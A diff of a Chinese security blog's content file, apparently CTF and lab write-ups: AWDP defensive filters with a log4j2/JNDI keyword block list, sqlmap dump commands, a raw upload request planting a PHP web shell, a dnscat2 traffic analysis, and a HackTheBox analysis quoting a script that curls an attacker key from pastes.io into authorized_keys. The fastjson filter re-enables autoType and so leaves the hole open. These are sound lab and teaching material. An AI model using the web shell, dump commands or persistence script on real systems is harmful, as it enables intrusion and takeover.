+<h3 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.ruoyi.common.xss;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 log4j2 的自定义防护</span><br><span class="line"> @ 过滤 url：在 WebFilter 当中添加 urlPatterns</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@Component</span><br><span class="line">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span><br><span class="line">public class Log4j2Filter implements Filter &#123;</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig arg0) throws ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">        // 获得所有请求参数名</span><br><span class="line">        Enumeration params = request.getParameterNames();</span><br><span class="line">        String sql = &quot;&quot;;</span><br><span class="line">        while (params.hasMoreElements()) &#123;</span><br><span class="line">            // 得到参数名</span><br><span class="line">            String name = params.nextElement().toString();</span><br><span class="line">            // 得到参数对应值</span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            for (int i = 0; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (sqlValidate(sql)) &#123;</span><br><span class="line">            throw new IOException(&quot;您发送请求中的参数中含有非法字符&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数校验</span><br><span class="line">     * @param str</span><br><span class="line">     */</span><br><span class="line">    public static boolean sqlValidate(String str) &#123;</span><br><span class="line">        str = str.toLowerCase();//统一转为小写</span><br><span class="line">        String badStr = &quot;$|$$|jndi|rmi|ldap|&#123;|&#125;|&quot;;</span><br><span class="line">        String[] badStrs = badStr.split(&quot;\\|&quot;);</span><br><span class="line">        for (int i = 0; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            //循环检测，判断在请求参数当中是否包含log4j2关键字</span><br><span class="line">            if (str.indexOf(badStrs[i]) &gt;= 0) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于文件上传的接口修改</span><br><span class="line"> @ 需要在对应接口中修改</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">public class securityUpload &#123;</span><br><span class="line">    @RequestMapping(&quot;/securityUpload&quot;)</span><br><span class="line">    public String handleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file)&#123;</span><br><span class="line">        if (file.isEmpty())&#123;</span><br><span class="line">            return &quot;请上传文件&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件名</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        String contentType = file.getContentType();</span><br><span class="line"></span><br><span class="line">        //过滤</span><br><span class="line">        String[] picWhite = &#123;&quot;.png&quot;,&quot;.jpg&quot;,&quot;.gif&quot;,&quot;.webp&quot;,&quot;.bmp&quot;&#125;;</span><br><span class="line">        String[] white_type = &#123;&quot;image/gif&quot;,&quot;image/jpeg&quot;,&quot;image/jpg&quot;,&quot;image/png&quot;&#125;;</span><br><span class="line">        Boolean SuffixFlag = false;</span><br><span class="line">        Boolean TypeFlag = false;</span><br><span class="line">        for (String pic_suffix:picWhite)&#123;</span><br><span class="line">            if (suffix.toLowerCase().equals(pic_suffix))&#123;</span><br><span class="line">                SuffixFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        for (String white_suffix:white_type)&#123;</span><br><span class="line">            if (contentType.toLowerCase().equals(white_suffix))&#123;</span><br><span class="line">                TypeFlag = true;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!SuffixFlag||!TypeFlag)&#123;</span><br><span class="line">            return &quot;File Type not allow&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String filePath = System.getProperty(&quot;user.dir&quot;)+&quot;/tmp&quot;;</span><br><span class="line"></span><br><span class="line">        Date date = new Date();</span><br><span class="line">        SimpleDateFormat dateFormat = new SimpleDateFormat(&quot;yyyyMMddhhmmss&quot;);</span><br><span class="line">        String newfileName = dateFormat.format(date)+Integer.toHexString((int)new Date().getTime())+suffix;</span><br><span class="line"></span><br><span class="line">        File dest = new File(filePath+File.separator+newfileName);</span><br><span class="line">        if (!dest.getParentFile().exists())&#123;</span><br><span class="line">            dest.getParentFile().mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        try&#123;</span><br><span class="line">            file.transferTo(dest);</span><br><span class="line">            return &quot;上传成功&quot;;</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package FastjsonFilters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.Objects;</span><br><span class="line">import java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> @ author: Drunkbaby</span><br><span class="line"> @ usages: 用于 Fastjson 的自定义防护</span><br><span class="line"> @ 针对 1.2.24 版本，则只添加过滤即可，若针对其他版本</span><br><span class="line"> ParserConfig.getGlobalInstance().setAutoTypeSupport(false); 将 autoTypeSupprt 设置为 false</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class Fastjson1224Filter &#123;</span><br><span class="line">    public String Unserjson(@RequestParam String str, @RequestParam String input) throws Exception &#123;</span><br><span class="line">        if (str != null &amp;&amp; Objects.hashCode(str) == secret.getKey().hashCode() &amp;&amp; !secret.getKey().equals(str)) &#123;</span><br><span class="line">            String pattern = &quot;.*rmi.*|.*jndi.*|.*ldap.*|.*\\\\x.*&quot;;</span><br><span class="line">            Pattern p = Pattern.compile(pattern, 2);</span><br><span class="line">            boolean StrMatch = p.matcher(input).matches();</span><br><span class="line">            if (StrMatch) &#123;</span><br><span class="line">                return &quot;Hacker get out!!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">            JSON.parseObject(input);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><h3 id="自定义过滤关键词-2"><a href="#自定义过滤关键词-2" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filterList := []string&#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;</span><br><span class="line">str := &quot;ana&quot; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for _, s := range filterList &#123;</span><br><span class="line">    if strings.Contains(s, str) &#123;</span><br><span class="line">        fmt.Println(&quot;Hacker!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="防御修复"><a href="#防御修复" class="headerlink" title="防御修复"></a>防御修复</h1><p>如果要求把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，大概思路就是在根目录下查找该漏洞对应的文件路径，然后把我们修复的上传即可</p>
+<h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv -f explorer.php $(dirname `find / -name &#x27;explorer.php&#x27; 2&gt;/dev/null`)/explorer.php</span><br></pre></td></tr></table></figure>
+
+<p>用find命令从根目录查找名为<code>explorer.php</code>的文件，然后返回他的路径名<code>dirname</code>，<code>2&gt;/dev/null</code>的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://5ime.cn/awdp.html">https://5ime.cn/awdp.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_51614272/article/details/125527593">https://blog.csdn.net/weixin_51614272/article/details/125527593</a></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>AWDP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2022-28512</title>
     <url>/article/CVE-2022-28512.html</url>
     <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
@@ -347,27 +574,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2022-32991</title>
-    <url>/article/CVE-2022-32991.html</url>
-    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
-<span id="more"></span>
-
-<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
-<p>对各个页面的参数就行sqlmap扫描</p>
-<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CVE-2022-30887</title>
     <url>/article/CVE-2022-30887.html</url>
     <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
@@ -383,6 +589,27 @@
 <p>发包即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>CVE-2022-32991</title>
+    <url>/article/CVE-2022-32991.html</url>
+    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
+<span id="more"></span>
+
+<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
+<p>对各个页面的参数就行sqlmap扫描</p>
+<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
 ]]></content>
       <categories>
         <category>春秋云镜</category>
@@ -762,6 +989,40 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC2024-数据泄露</title>
+    <url>/article/ISCC2024-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2.html</url>
+    <content><![CDATA[<p>ISCC2024擂台赛的一道流量分析题，和内网渗透中搭建隧道事件有关</p>
+<span id="more"></span>
+
+<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p><strong>题目要求</strong></p>
+<blockquote>
+<p>公司主机被攻击了，请根据流量文件，找到攻击者所使用的 DNS 隧道工具的原始文件名。请提交文件名的小写md5</p>
+</blockquote>
+<p>打开文件发现存在大量DNS的数据包，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dns &amp;&amp; ip.src==192.168.157.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503205838886.png" alt="image-20240503205838886"></p>
+<p>发现这些包非常大，并且对应域名过长</p>
+<p><strong>明显的 dnscat2 流量特征（解析域名过长，使用 CNAME、TXT、MX 记录的查询）</strong></p>
+<p>我们导出为纯文本文件</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210020711.png" alt="image-20240503210020711"></p>
+<p>将域名<code>microsofto365.com</code>前面部分提取出来（就提取的前面几部分）</p>
+<p>解码脚本如下 <a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=265941">参考文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex_string=&#x27;1ae6012ec72fe4b1f14d6963726f736f66742057696e646f7773205b5665&#x27;</span><br><span class="line">hex_string=hex_string.replace(&#x27;.&#x27;,&#x27;&#x27;)</span><br><span class="line">#将字符按照每两个字符分组，转换成十六进制数</span><br><span class="line">hex_parts=[hex_string[i:i+2] for i in range(0,len(hex_string),2)]</span><br><span class="line"></span><br><span class="line">#转换成ascii字符</span><br><span class="line">ascii_result=&#x27;&#x27;.join(chr(int(hex,16)) for hex in hex_parts)</span><br><span class="line">print(ascii_result)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210239942.png" alt="image-20240503210239942"></p>
+<p>注意到DNS隧道工具dnscat2，不过有乱码</p>
+<p>直接搜索引擎确定文件名</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210351782.png" alt="image-20240503210351782"></p>
+<p>然后在线网站MD5加密一下，上面那个就是flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240503210412841.png" alt="image-20240503210412841"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
     <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
     <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
@@ -909,89 +1170,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Meerkat-HackTheBox</title>
-    <url>/article/Meerkat-HackTheBox.html</url>
-    <content><![CDATA[<p>巨魔给的面试题，打开HTB的流量分析大门</p>
-<span id="more"></span>
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>作为一家快速发展的初创公司，Forela 一直在利用业务管理平台。不幸的是，我们的文档很少，而且我们的管理员也不是最有安全意识的。作为我们新的安全提供商，我们希望您查看我们导出的一些 PCAP 和日志数据，以确认我们是否已（或尚未）受到损害。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>我们相信我们的业务管理平台服务器已受到损害。请确认正在运行的应用程序的名称？</strong></p>
-<p>筛选http请求，然后追踪tcp流发现<code>/bonita/portal/homepage</code></p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418110808186.png"></p>
-<p>很明显是和bonita有关，google搜索引擎得到答案为<code>bonitasoft</code></p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418110940647.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>我们认为攻击者可能使用了暴力破解攻击类别的子集 - 所执行的攻击的名称是什么？</strong></p>
-<p>经过查看后续的一些 http 包，可以发现产生了大量失败的登录请求，可以怀疑攻击者正在尝试进行凭据爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Credential Stuffing</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>所利用的漏洞是否分配有 CVE - 如果有，是哪一个？</strong></p>
-<p>查找一下是否有被命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
-<p>可以发现在第1091个流出现命令执行，往前翻找到黑客上传zip文件进行攻击</p>
-<p>那么肯定是通过此zip文件使得命令执行得到root权限</p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418111436776.png"></p>
-<p>通过搜索引擎可以知道漏洞编号为<code>CVE-2022-25237</code></p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418111600611.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>攻击者利用哪个字符串附加到 API URL 路径来绕过授权过滤器？</strong></p>
-<p>我们往下找，注意到<code>/bonita/API/portal/page/;i18ntranslation</code>路径的请求，并且后面就直接RCE了，说明<code>i18ntranslation</code>字符大概率是绕过waf。</p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418111822445.png"></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>撞库攻击中使用了多少种用户名和密码组合？</strong></p>
-<p>查看访问<code>/bonita/loginservice</code>总共多少个包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Meerkat-HackTheBox/image-20240418195919731.png"></p>
-<p>但是发现很多个包username和password均为install，这些我们不用算在里面所以排除一下</p>
-<p>（当然也可以url解码username会发现为邮箱格式）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;</span><br></pre></td></tr></table></figure>
-
-<p>右下角显示59个，因为可能存在重复密码所以要查看下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot; &amp;&amp; http contains &quot;seb.broom%40forela.co.uk&quot;</span><br></pre></td></tr></table></figure>
-
-<p>找到用户名<code>seb.broom%40forela.co.uk</code>存在四次重复密码</p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418200345629.png"></p>
-<p>整理一下<code>59-4+1</code>总共56次碰撞</p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>哪个用户名和密码组合成功？</strong></p>
-<p>我们查找一下响应包也就是用到<code>ip.src</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==172.31.6.44</span><br></pre></td></tr></table></figure>
-
-<p>注意到响应为204说明爆破成功，追踪下tcp</p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418200905116.png"></p>
-<p>得到用户名和密码（答案注意url编码）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=seb.broom%40forela.co.uk&amp;password=g0vernm3nt</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>如果有，攻击者使用了哪个文本共享网站？</strong></p>
-<p>使用网站的话那么请求包中应该有<code>http</code>字符（也可以筛选字符串<code>cmd</code>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;http&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>
-
-<p>找到为<code>pastes.io</code></p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418201250245.png"></p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>请提供攻击者用于在我们的主机上获得持久性的公钥的文件名。</strong></p>
-<p>我们已经知道黑客用wget去下载该文件，我们打开kali去下载看看</p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418202654452.png"></p>
-<p>不给连接这就怪了，文件内容如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>
-
-<p>所以文件名为<code>hffgra4unv</code></p>
-<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>您能否确认攻击者修改的文件以获得持久性？</strong></p>
-<p>通过前一道题可以知道用curl命令将文件写到<code>/home/ubuntu/.ssh/authorized_keys</code></p>
-<p>所以能知道攻击者修改了文件</p>
-<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>您能确认这种持久性机制的 MITRE 技术 ID 吗？</strong></p>
-<p>搜索引擎搜索<code>MITRE authorized_keys</code> ，成功找到id为<code>T1098.004</code></p>
-<p><img src="/article/Meerkat-HackTheBox/image-20240418203318734.png"></p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Monitored-HackTheBox</title>
     <url>/article/Monitored-HackTheBox.html</url>
     <content><![CDATA[<p>snmp协议</p>
@@ -1097,6 +1275,89 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Meerkat-HackTheBox</title>
+    <url>/article/Meerkat-HackTheBox.html</url>
+    <content><![CDATA[<p>巨魔给的面试题，打开HTB的流量分析大门</p>
+<span id="more"></span>
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>作为一家快速发展的初创公司，Forela 一直在利用业务管理平台。不幸的是，我们的文档很少，而且我们的管理员也不是最有安全意识的。作为我们新的安全提供商，我们希望您查看我们导出的一些 PCAP 和日志数据，以确认我们是否已（或尚未）受到损害。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>我们相信我们的业务管理平台服务器已受到损害。请确认正在运行的应用程序的名称？</strong></p>
+<p>筛选http请求，然后追踪tcp流发现<code>/bonita/portal/homepage</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418110808186.png"></p>
+<p>很明显是和bonita有关，google搜索引擎得到答案为<code>bonitasoft</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418110940647.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>我们认为攻击者可能使用了暴力破解攻击类别的子集 - 所执行的攻击的名称是什么？</strong></p>
+<p>经过查看后续的一些 http 包，可以发现产生了大量失败的登录请求，可以怀疑攻击者正在尝试进行凭据爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Credential Stuffing</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>所利用的漏洞是否分配有 CVE - 如果有，是哪一个？</strong></p>
+<p>查找一下是否有被命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现在第1091个流出现命令执行，往前翻找到黑客上传zip文件进行攻击</p>
+<p>那么肯定是通过此zip文件使得命令执行得到root权限</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111436776.png"></p>
+<p>通过搜索引擎可以知道漏洞编号为<code>CVE-2022-25237</code></p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111600611.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>攻击者利用哪个字符串附加到 API URL 路径来绕过授权过滤器？</strong></p>
+<p>我们往下找，注意到<code>/bonita/API/portal/page/;i18ntranslation</code>路径的请求，并且后面就直接RCE了，说明<code>i18ntranslation</code>字符大概率是绕过waf。</p>
+<p><img src="/article/Meerkat-HackTheBox/image-20240418111822445.png"></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>撞库攻击中使用了多少种用户名和密码组合？</strong></p>
+<p>查看访问<code>/bonita/loginservice</code>总共多少个包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Meerkat-HackTheBox/image-20240418195919731.png"></p>
+<p>但是发现很多个包username和password均为install，这些我们不用算在里面所以排除一下</p>
+<p>（当然也可以url解码username会发现为邮箱格式）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri==&quot;/bonita/loginservice&quot; &amp;&amp; !http contains &quot;install&quot;</span><br></pre></td></tr></table></figure>
+
+<p>右下角显示59个，因为可能存在重复密码所以要查看下</p>
